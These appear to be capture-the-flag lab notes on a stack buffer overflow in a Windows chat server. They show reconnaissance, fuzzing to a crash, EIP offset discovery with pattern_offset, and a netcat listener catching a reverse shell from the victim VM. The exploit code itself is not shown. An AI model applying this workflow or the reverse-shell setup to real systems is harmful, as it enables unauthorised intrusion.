
In our Windows 10 VM, we start x32dbg and open the chatserver.exe.

We start it and run netstat to confirm the port number:
```sh
C:\Windows\system32>netstat -ab

Active Connections

  Proto  Local Address          Foreign Address        State
...
TCP    0.0.0.0:9999           DESKTOP-S2GUNPV:0      LISTENING
 [chatserver.exe]
...
```

lab machine nmap:
```sh
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sC -sV -Pn 192.168.233.129
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 16:41 CEST
Nmap scan report for 192.168.233.129
Host is up (0.00036s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
5040/tcp open  unknown
5357/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
7680/tcp open  pando-pub?
9999/tcp open  abyss?
| fingerprint-strings: 
|   afp, giop: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters): Write a message:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.94SVN%I=7%D=10/15%Time=670E81A8%P=x86_64-pc-linux-gnu%
SF:r(afp,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20en
SF:ter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x
SF:20message:\x20")%r(giop,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(be
SF:ta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\
SF:):\x20Write\x20a\x20message:\x20");
MAC Address: 00:0C:29:2A:98:49 (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 690.97 seconds
```

Let's make a script and run it fuzzer.py

Result:
```
C:\Users\Windows10x64VMUser\Desktop\thm-brainstorm>python fuzzer.py
Sending user name
Fuzzing with 100 bytes
Sending user name
Fuzzing with 200 bytes
Sending user name
...
Fuzzing with 2000 bytes
Sending user name
Fuzzing with 2100 bytes
Fuzzing crashed
```

Server output:
```
Chat Server started!
Called essential function dll version 1.00

Waiting for connections.
Received a client connection from 127.0.0.1:50118
Client 127.0.0.1:50118 selected username: usernam

Encountered following winsock error while starting server:
10053: An established connection was aborted by the software in your host machine.

Received a client connection from 127.0.0.1:50119
Client 127.0.0.1:50119 selected username: usernam

Encountered following winsock error while starting server:
10054: An existing connection was forcibly closed by the remote host.

Received a client connection from 127.0.0.1:50120
Client 127.0.0.1:50120 selected username: usernam
Client 127.0.0.1:50120 closed connection.
Received a client connection from 127.0.0.1:50121
Client 127.0.0.1:50121 selected username: usernam

Encountered following winsock error while starting server:
10053: An established connection was aborted by the software in your host machine.

...

Received a client connection from 127.0.0.1:50137
Client 127.0.0.1:50137 selected username: usernam

Encountered following winsock error while starting server:
10053: An established connection was aborted by the software in your host machine.

Received a client connection from 127.0.0.1:50138
Client 127.0.0.1:50138 selected username: usernam
```

EIP value: 31704330

```sh
┌──(kali㉿kali)-[~]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x31704330
[*] Exact match at offset 2012
```

Offset: 2012

```sh
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 443                    
listening on [any] 443 ...
connect to [192.168.233.133] from (UNKNOWN) [192.168.233.129] 49933
Microsoft Windows [Version 10.0.19045.5011]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Windows10x64VMUser\Desktop\thm-brainstorm>

C:\Users\Windows10x64VMUser\Desktop\thm-brainstorm>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6C8C-39C2

 Directory of C:\Users\Windows10x64VMUser\Desktop\thm-brainstorm

2024-10-15  07:28    <DIR>          .
2024-10-15  07:28    <DIR>          ..
2019-08-29  13:26            43�747 chatserver.exe
2019-08-29  13:27            30�761 essfunc.dll
2024-10-15  09:46             2�892 exploit.py
2024-10-15  06:43             5�747 fuzzer-username.py
2024-10-15  08:06             5�740 fuzzer.py
               5 File(s)         88�887 bytes
               2 Dir(s)  35�037�577�216 bytes free

C:\Users\Windows10x64VMUser\Desktop\thm-brainstorm>exit
exit
```
